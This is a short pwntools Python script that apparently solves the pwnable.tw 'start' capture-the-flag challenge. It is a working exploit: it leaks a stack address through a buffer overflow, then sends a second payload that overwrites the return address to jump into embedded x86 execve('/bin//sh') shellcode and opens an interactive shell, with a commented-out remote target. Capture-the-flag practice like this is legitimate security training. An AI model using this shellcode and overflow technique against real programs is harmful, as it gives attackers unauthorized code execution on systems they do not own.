from pwn import *

BIN = "./start"
DEBUG = 1

shellcode = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
addr = 0x08048087 

io = process(BIN)
context.log_level = 'debug'
# io = remote("chall.pwnable.tw", 10000)


_breakpoint = """
		0x08048099
	"""
gdb.attach(io,_breakpoint)
io.recvuntil("CTF:")
payload = b'A' * 0x14 + p32(addr)
io.send(payload)
esp_addr = u32(io.recv(4))
 
print("[+]Esp address = ", hex(esp_addr))
 
payload = b'A' * 0x14 + p32(esp_addr + 0x14) + shellcode
io.sendline(payload)
io.interactive()
